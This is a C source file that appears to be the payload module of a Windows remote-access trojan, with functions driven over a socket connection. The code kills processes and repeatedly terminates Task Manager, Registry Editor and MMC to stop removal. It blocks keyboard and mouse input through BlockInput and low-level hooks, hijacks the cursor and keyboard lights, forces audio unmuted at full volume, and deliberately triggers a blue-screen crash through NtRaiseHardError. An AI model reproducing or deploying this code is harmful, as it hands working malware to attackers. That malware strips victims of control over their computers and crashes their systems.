#include <stdio.h>
#include <math.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <ctype.h>

// fmu
#include <commctrl.h>
#include <initguid.h> // must include before mmdeviceapi.h, endpointvolue.h to have: CLSID_MMDeviceEnumerator, etc.
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <audioclient.h>


#include "main.h"
#include "cry_socket.h"

// send msg
static DWORD WINAPI admin_msg_thread(void* data) {
	char* text_ = (char*)data;
	int l = strlen(text_);
	char text[l+1];
	memset(text, 0, l);
	strcpy(text, text_);
	free(text_);
	return MessageBox(NULL, text, "", MB_OK | MB_SYSTEMMODAL);
}
HANDLE admin_msg(const char* text) { char* dup = strdup(text); return CreateThread(NULL, 0, admin_msg_thread, (void*)dup, 0, NULL); }

// kill
static BOOL TerminateProcessEx(DWORD dwProcessId, UINT uExitCode) {
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);
	if (hProcess == NULL) { return FALSE; }
	BOOL result = TerminateProcess(hProcess, uExitCode);
	CloseHandle(hProcess);
	return result;
}
int kill(SOCKET sock, const char* procNameOrId) {
	
	DWORD pID = -1;
	
	// check if input is number (id) or process name
	BOOL isID = TRUE;
	for (unsigned int i = 0; i < strlen(procNameOrId); i++) {
		if (!isdigit(procNameOrId[i])) { isID = FALSE; }
	}
	if (isID) { pID = atoi(procNameOrId); }
	
	HANDLE thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE) {
		char msg[] = "failed to get snapshot handle\n";
		sendE(sock, msg, strlen(msg), 0);
		return 0;
	} 
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL retval = Process32First(thSnapShot, &pe);
	
	int killed = 0;
	int failed = 0;
	while (retval) {
		if ((isID ? (pe.th32ProcessID == pID) : (StrStrI(pe.szExeFile, procNameOrId) != NULL))) {
			char msg[BIGSIZ] = {0};
			snprintf(msg, BIGSIZ, "%ld\t: %s", pe.th32ProcessID, pe.szExeFile);
			if (TerminateProcessEx(pe.th32ProcessID, 0)) {
				killed++;
				strcat(msg, " - SUCCESS\n");
			}
			else {
				failed++;
				strcat(msg, " - FAILED\n");
			}
			
			sendE(sock, msg, strlen(msg), 0);
		}
		
		retval = Process32Next(thSnapShot, &pe);
	}
	
	// cleanup
	CloseHandle(thSnapShot);
	
	// send stats
	char msg[BIGSIZ] = {0};
	snprintf(msg, BIGSIZ, "\nkilled: %d\nfailed: %d\n", killed, failed);
	sendE(sock, msg, strlen(msg), 0);
	
	return killed;
}

// list proc
int listproc(SOCKET sock, const char* procNameOrId) {
	
	// check if input is number (id) or process name
	DWORD pID = -1;
	BOOL isID = TRUE;
	if (procNameOrId != NULL) {
		for (size_t i = 0; i < strlen(procNameOrId); i++) {
			if (!isdigit(procNameOrId[i])) { isID = FALSE; }
		}
		if (isID) { pID = atoi(procNameOrId); }
	}
	
	
	HANDLE thSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (thSnapShot == INVALID_HANDLE_VALUE) {
		char msg[] = "failed to get snapshot handle\n";
		sendE(sock, msg, strlen(msg), 0);
		return 1;
	} 
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(PROCESSENTRY32);
	BOOL retval = Process32First(thSnapShot, &pe);
	while (retval) {
		retval = Process32Next(thSnapShot, &pe);
		if (procNameOrId != NULL && !(isID ? (pe.th32ProcessID == pID) : (StrStrI(pe.szExeFile, procNameOrId) != NULL))) { continue; }
		char msg[BIGSIZ] = {0};
		snprintf(msg, BIGSIZ, "%ld\t: %s\n", pe.th32ProcessID, pe.szExeFile);
		sendE(sock, msg, strlen(msg), 0);
	}
	
	CloseHandle(thSnapShot);
	
	return 0;
}

// circle mouse
static BOOL admin_cm_bool;
static DWORD WINAPI admin_cm_thread() {
	
	admin_cm_bool = TRUE;
	
	// screen size
	HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);
	
	float r = 100;
	float cx = (width  / 2) - r;
	float cy = (height / 2) - r;
	
	float num_segments = 100;
	
	while(admin_cm_bool) {
		for(float i = 0; i < num_segments; i++) {
			float theta = 2.0f * 3.1415926f * i / num_segments;
			float x = r * cosf(theta);
			float y = r * sinf(theta);
			SetCursorPos(x + cx, y + cy);
			Sleep(5);
			if (!admin_cm_bool) { break; }
		}
	}
	
	return 0;
}
HANDLE admin_cm_on()  { return CreateThread(NULL, 0, admin_cm_thread, NULL, 0, NULL); }
void   admin_cm_off() { admin_cm_bool = FALSE; }

// keyboard disco
static void skey(int vkey) {
	INPUT input;
	ZeroMemory(&input, sizeof(input));
	input.type = INPUT_KEYBOARD;
	input.ki.wScan = MapVirtualKey(vkey, MAPVK_VK_TO_VSC);
	input.ki.time = 0;
	input.ki.dwExtraInfo = 0;
	input.ki.wVk = vkey;
	input.ki.dwFlags = 0; // KEYEVENTF_KEYDOWN existn't
	SendInput(1, &input, sizeof(INPUT));
	input.ki.dwFlags = KEYEVENTF_KEYUP;
	SendInput(1, &input, sizeof(INPUT));
}
static BOOL admin_kbd_bool;
static DWORD WINAPI admin_kbd_thread() {
	admin_kbd_bool = TRUE;
	
	#define delaySleep 100
	while(admin_kbd_bool) {
		skey(VK_NUMLOCK);
		Sleep(delaySleep);
		skey(VK_CAPITAL);
		Sleep(delaySleep);
		skey(VK_SCROLL);
		Sleep(delaySleep);
	}
	
	return 0;
}
HANDLE admin_kbd_on()  { return CreateThread(NULL, 0, admin_kbd_thread, NULL, 0, NULL); }
void   admin_kbd_off() { admin_kbd_bool = FALSE; }

// disable admin tools (taskmgr, regedit, services, ...)
static BOOL admin_atk_bool;
static DWORD WINAPI admin_atk_thread() {
	
	admin_atk_bool = TRUE;
	
	while (admin_atk_bool) {
		kill(INVALID_SOCKET, "taskmgr.exe");
		kill(INVALID_SOCKET, "regedit.exe");
		kill(INVALID_SOCKET, "mmc.exe");
		Sleep(800);
	}
	
	return 0;
}
HANDLE admin_atk_on()  { return CreateThread(NULL, 0, admin_atk_thread, NULL, 0, NULL); }
void   admin_atk_off() { admin_atk_bool = FALSE; }

#if SHELL_MASK

HANDLE admin_bi_on() { return NULL; }
void   admin_bi_off() {}

#else

// normal block input
static BOOL admin_bi_bool;
static DWORD WINAPI admin_bi_thread() {
	
	admin_bi_bool = TRUE;
	while (admin_bi_bool) {
		BlockInput(TRUE);
		Sleep(100);
	}
	
	BlockInput(FALSE);
	return 0;
}
HANDLE admin_bi_on()  { return CreateThread(NULL, 0, admin_bi_thread, NULL, 0, NULL); }
void   admin_bi_off() { admin_bi_bool = FALSE; }

#endif

	
// block input exploit
static DWORD admin_bie_id;
static HHOOK admin_bie_hook_keyboard;
static HHOOK admin_bie_hook_mouse;
static LRESULT __stdcall admin_bie_callback() {
	return 1; // block input
	//return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
static DWORD WINAPI admin_bie_thread() {
	
	admin_bie_id = GetCurrentThreadId();
	
	// hooks
	if (!(admin_bie_hook_keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, admin_bie_callback, NULL, 0))) { return FALSE; }
	if (!(admin_bie_hook_mouse    = SetWindowsHookEx(WH_MOUSE_LL,    admin_bie_callback, NULL, 0))) { return FALSE; }
	
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	
	// unhook
	UnhookWindowsHookEx(admin_bie_hook_keyboard);
	UnhookWindowsHookEx(admin_bie_hook_mouse);
	return TRUE;
}
HANDLE admin_bie_on()  { return CreateThread(NULL, 0, admin_bie_thread, NULL, 0, NULL); }
BOOL   admin_bie_off() { return PostThreadMessage(admin_bie_id, WM_QUIT, 0, 0); }


static BOOL admin_fmu_bool;
static DWORD WINAPI admin_fmu_thread() {
	
	admin_fmu_bool = TRUE;
	
	IMMDeviceEnumerator* deviceEnumerator = NULL;
	if (SUCCEEDED(CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL, &IID_IMMDeviceEnumerator, (LPVOID*)&deviceEnumerator))) {
		IMMDevice* defaultDevice = NULL;
		if (SUCCEEDED(deviceEnumerator->lpVtbl->GetDefaultAudioEndpoint(deviceEnumerator, eRender, eConsole, &defaultDevice))) {
			
			IAudioEndpointVolume* endpointVolume = NULL;
			BOOL isSet1 = SUCCEEDED(defaultDevice->lpVtbl->Activate(defaultDevice, &IID_IAudioEndpointVolume, CLSCTX_ALL, NULL, (LPVOID*)&endpointVolume));
			
			#define REFTIMES_PER_SEC 10000000
			IAudioClient* audioClient = NULL;
			ISimpleAudioVolume* simpleAudioVolume = NULL;
			BOOL isSet2 = FALSE;
			if (SUCCEEDED(defaultDevice->lpVtbl->Activate(defaultDevice, &IID_IAudioClient, CLSCTX_ALL, NULL, (LPVOID*)&audioClient))) {
				WAVEFORMATEX* pwfx = NULL;
				if (SUCCEEDED(audioClient->lpVtbl->GetMixFormat(audioClient, &pwfx))) {
					if (SUCCEEDED(audioClient->lpVtbl->Initialize(audioClient, AUDCLNT_SHAREMODE_SHARED, 0, REFTIMES_PER_SEC, REFTIMES_PER_SEC, pwfx, NULL))) {
						if (SUCCEEDED(audioClient->lpVtbl->GetService(audioClient, &IID_ISimpleAudioVolume, (LPVOID*)&simpleAudioVolume))) {
							isSet2 = TRUE;
						}
					}
				}
				audioClient->lpVtbl->Release(audioClient);
			}
				
			while (admin_fmu_bool) {
				if (isSet1) {
					endpointVolume->lpVtbl->SetMute(endpointVolume, FALSE, NULL);
					endpointVolume->lpVtbl->SetMasterVolumeLevelScalar(endpointVolume, 1.0f, NULL);
				}
				
				if (isSet2) {
					simpleAudioVolume->lpVtbl->SetMute(simpleAudioVolume, FALSE, NULL);
					simpleAudioVolume->lpVtbl->SetMasterVolume(simpleAudioVolume, 1.0f, NULL);
				}
				
				Sleep(10);
			}
			
			if (isSet1) { endpointVolume->lpVtbl->Release(endpointVolume); }
			if (isSet2) { simpleAudioVolume->lpVtbl->Release(simpleAudioVolume); }
			
			
			defaultDevice->lpVtbl->Release(defaultDevice);
		}
		deviceEnumerator->lpVtbl->Release(deviceEnumerator);
	}
	return 1;
}
HANDLE admin_fmu_on()  { return CreateThread(NULL, 0, admin_fmu_thread, NULL, 0, NULL); }
void   admin_fmu_off() { admin_fmu_bool = FALSE; }


// blue screen of death
NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
void bsod() {
	BOOLEAN bl;
	unsigned long response;
	RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // get privileges
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response); // cause bsod
}